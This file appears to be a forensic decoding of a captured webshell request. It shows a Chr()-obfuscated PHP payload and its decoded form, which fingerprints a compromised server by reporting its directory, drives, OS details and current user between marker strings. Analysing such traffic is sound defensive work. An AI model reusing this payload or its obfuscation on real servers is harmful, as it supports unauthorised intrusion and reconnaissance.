// 通过字符串 str 进行 chr 解码后规范化得到的字符串
// str = 'Chr(64).Chr(105).Chr(110).Chr(105).Chr(95).Chr(115).Chr(101).Chr(116).Chr(40).Chr(34).Chr(100).Chr(105).Chr(115).Chr(112).Chr(108).Chr(97).Chr(121).Chr(95).Chr(101).Chr(114).Chr(114).Chr(111).Chr(114).Chr(115).Chr(34).Chr(44).Chr(32).Chr(34).Chr(48).Chr(34).Chr(41).Chr(59).Chr(64).Chr(115).Chr(101).Chr(116).Chr(95).Chr(116).Chr(105).Chr(109).Chr(101).Chr(95).Chr(108).Chr(105).Chr(109).Chr(105).Chr(116).Chr(40).Chr(48).Chr(41).Chr(59).Chr(102).Chr(117).Chr(110).Chr(99).Chr(116).Chr(105).Chr(111).Chr(110).Chr(32).Chr(97).Chr(115).Chr(101).Chr(110).Chr(99).Chr(40).Chr(36).Chr(111).Chr(117).Chr(116).Chr(41).Chr(123).Chr(114).Chr(101).Chr(116).Chr(117).Chr(114).Chr(110).Chr(32).Chr(36).Chr(111).Chr(117).Chr(116).Chr(59).Chr(125).Chr(59).Chr(102).Chr(117).Chr(110).Chr(99).Chr(116).Chr(105).Chr(111).Chr(110).Chr(32).Chr(97).Chr(115).Chr(111).Chr(117).Chr(116).Chr(112).Chr(117).Chr(116).Chr(40).Chr(41).Chr(123).Chr(36).Chr(111).Chr(117).Chr(116).Chr(112).Chr(117).Chr(116).Chr(61).Chr(111).Chr(98).Chr(95).Chr(103).Chr(101).Chr(116).Chr(95).Chr(99).Chr(111).Chr(110).Chr(116).Chr(101).Chr(110).Chr(116).Chr(115).Chr(40).Chr(41).Chr(59).Chr(111).Chr(98).Chr(95).Chr(101).Chr(110).Chr(100).Chr(95).Chr(99).Chr(108).Chr(101).Chr(97).Chr(110).Chr(40).Chr(41).Chr(59).Chr(101).Chr(99).Chr(104).Chr(111).Chr(32).Chr(34).Chr(90).Chr(84).Chr(74).Chr(67).Chr(49).Chr(52).Chr(55).Chr(34).Chr(59).Chr(101).Chr(99).Chr(104).Chr(111).Chr(32).Chr(64).Chr(97).Chr(115).Chr(101).Chr(110).Chr(99).Chr(40).Chr(36).Chr(111).Chr(117).Chr(116).Chr(112).Chr(117).Chr(116).Chr(41).Chr(59).Chr(101).Chr(99).Chr(104).Chr(111).Chr(32).Chr(34).Chr(90).Chr(84).Chr(74).Chr(67).Chr(50).Chr(53).Chr(56).Chr(34).Chr(59).Chr(125).Chr(111).Chr(98).Chr(95).Chr(115).Chr(116).Chr(97).Chr(114).Chr(116).Chr(40).Chr(41).Chr(59).Chr(116).Chr(114).Chr(121).Chr(123).Chr(36).Chr(68).Chr(61).Chr(100).Chr(105).Chr(114).Chr(110).Chr(97).Chr(109).Chr(101).Chr(40).Chr(36).Chr(95).Chr(83).Chr(69).Chr(82).Chr(86).Chr(69).Chr(82).Chr(91).Chr(34).Chr(83).Chr(67).Chr(82).Chr(73).Chr(80).Chr(84).Chr(95).Chr(70).Chr(73).Chr(76).Chr(69).Chr(78).Chr(65).Chr(77).Chr(69).Chr(34).Chr(93).Chr(41).Chr(59).Chr(105).Chr(102).Chr(40).Chr(36).Chr(68).Chr(61).Chr(61).Chr(34).Chr(34).Chr(41).Chr(36).Chr(68).Chr(61).Chr(100).Chr(105).Chr(114).Chr(110).Chr(97).Chr(109).Chr(101).Chr(40).Chr(36).Chr(95).Chr(83).Chr(69).Chr(82).Chr(86).Chr(69).Chr(82).Chr(91).Chr(34).Chr(80).Chr(65).Chr(84).Chr(72).Chr(95).Chr(84).Chr(82).Chr(65).Chr(78).Chr(83).Chr(76).Chr(65).Chr(84).Chr(69).Chr(68).Chr(34).Chr(93).Chr(41).Chr(59).Chr(36).Chr(82).Chr(61).Chr(34).Chr(123).Chr(36).Chr(68).Chr(125).Chr(9).Chr(34).Chr(59).Chr(105).Chr(102).Chr(40).Chr(115).Chr(117).Chr(98).Chr(115).Chr(116).Chr(114).Chr(40).Chr(36).Chr(68).Chr(44).Chr(48).Chr(44).Chr(49).Chr(41).Chr(33).Chr(61).Chr(34).Chr(47).Chr(34).Chr(41).Chr(123).Chr(102).Chr(111).Chr(114).Chr(101).Chr(97).Chr(99).Chr(104).Chr(40).Chr(114).Chr(97).Chr(110).Chr(103).Chr(101).Chr(40).Chr(34).Chr(67).Chr(34).Chr(44).Chr(34).Chr(90).Chr(34).Chr(41).Chr(97).Chr(115).Chr(32).Chr(36).Chr(76).Chr(41).Chr(105).Chr(102).Chr(40).Chr(105).Chr(115).Chr(95).Chr(100).Chr(105).Chr(114).Chr(40).Chr(34).Chr(123).Chr(36).Chr(76).Chr(125).Chr(58).Chr(34).Chr(41).Chr(41).Chr(36).Chr(82).Chr(46).Chr(61).Chr(34).Chr(123).Chr(36).Chr(76).Chr(125).Chr(58).Chr(34).Chr(59).Chr(125).Chr(101).Chr(108).Chr(115).Chr(101).Chr(123).Chr(36).Chr(82).Chr(46).Chr(61).Chr(34).Chr(47).Chr(34).Chr(59).Chr(125).Chr(36).Chr(82).Chr(46).Chr(61).Chr(34).Chr(9).Chr(34).Chr(59).Chr(36).Chr(117).Chr(61).Chr(40).Chr(102).Chr(117).Chr(110).Chr(99).Chr(116).Chr(105).Chr(111).Chr(110).Chr(95).Chr(101).Chr(120).Chr(105).Chr(115).Chr(116).Chr(115).Chr(40).Chr(34).Chr(112).Chr(111).Chr(115).Chr(105).Chr(120).Chr(95).Chr(103).Chr(101).Chr(116).Chr(101).Chr(103).Chr(105).Chr(100).Chr(34).Chr(41).Chr(41).Chr(63).Chr(64).Chr(112).Chr(111).Chr(115).Chr(105).Chr(120).Chr(95).Chr(103).Chr(101).Chr(116).Chr(112).Chr(119).Chr(117).Chr(105).Chr(100).Chr(40).Chr(64).Chr(112).Chr(111).Chr(115).Chr(105).Chr(120).Chr(95).Chr(103).Chr(101).Chr(116).Chr(101).Chr(117).Chr(105).Chr(100).Chr(40).Chr(41).Chr(41).Chr(58).Chr(34).Chr(34).Chr(59).Chr(36).Chr(115).Chr(61).Chr(40).Chr(36).Chr(117).Chr(41).Chr(63).Chr(36).Chr(117).Chr(91).Chr(34).Chr(110).Chr(97).Chr(109).Chr(101).Chr(34).Chr(93).Chr(58).Chr(64).Chr(103).Chr(101).Chr(116).Chr(95).Chr(99).Chr(117).Chr(114).Chr(114).Chr(101).Chr(110).Chr(116).Chr(95).Chr(117).Chr(115).Chr(101).Chr(114).Chr(40).Chr(41).Chr(59).Chr(36).Chr(82).Chr(46).Chr(61).Chr(112).Chr(104).Chr(112).Chr(95).Chr(117).Chr(110).Chr(97).Chr(109).Chr(101).Chr(40).Chr(41).Chr(59).Chr(36).Chr(82).Chr(46).Chr(61).Chr(34).Chr(9).Chr(123).Chr(36).Chr(115).Chr(125).Chr(34).Chr(59).Chr(101).Chr(99).Chr(104).Chr(111).Chr(32).Chr(36).Chr(82).Chr(59).Chr(59).Chr(125).Chr(99).Chr(97).Chr(116).Chr(99).Chr(104).Chr(40).Chr(69).Chr(120).Chr(99).Chr(101).Chr(112).Chr(116).Chr(105).Chr(111).Chr(110).Chr(32).Chr(36).Chr(101).Chr(41).Chr(123).Chr(101).Chr(99).Chr(104).Chr(111).Chr(32).Chr(34).Chr(69).Chr(82).Chr(82).Chr(79).Chr(82).Chr(58).Chr(47).Chr(47).Chr(34).Chr(46).Chr(36).Chr(101).Chr(45).Chr(62).Chr(103).Chr(101).Chr(116).Chr(77).Chr(101).Chr(115).Chr(115).Chr(97).Chr(103).Chr(101).Chr(40).Chr(41).Chr(59).Chr(125).Chr(59).Chr(97).Chr(115).Chr(111).Chr(117).Chr(116).Chr(112).Chr(117).Chr(116).Chr(40).Chr(41).Chr(59).Chr(100).Chr(105).Chr(101).Chr(40).Chr(41).Chr(59)'
<?php // 2023-07-29 06:41:00 , 解码后无慈航
@ini_set("display_errors", "0");
@set_time_limit(0);
function asenc($out){
	return $out;
};

function asoutput(){
	$output=ob_get_contents();
	ob_end_clean();
	echo "ZTJC147";
	echo @asenc($output);
	echo "ZTJC258";
}

ob_start();
try{
	$D=dirname($_SERVER["SCRIPT_FILENAME"]);
	if($D=="")
		$D=dirname($_SERVER["PATH_TRANSLATED"]);
		$R="{$D}    ";
	if(substr($D,0,1)!="/"){
		foreach(range("C","Z") as $L)
			if(is_dir("{$L}:"))
				$R.="{$L}:";
	}else{
		$R.="/";
	}

	$R.="    ";
	$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
	$s=($u)?$u["name"]:@get_current_user();
	$R.=php_uname();
	$R.="    {$s}";
	echo $R;;
}catch(Exception $e){
	echo "ERROR://".$e->getMessage();
};

asoutput();
die();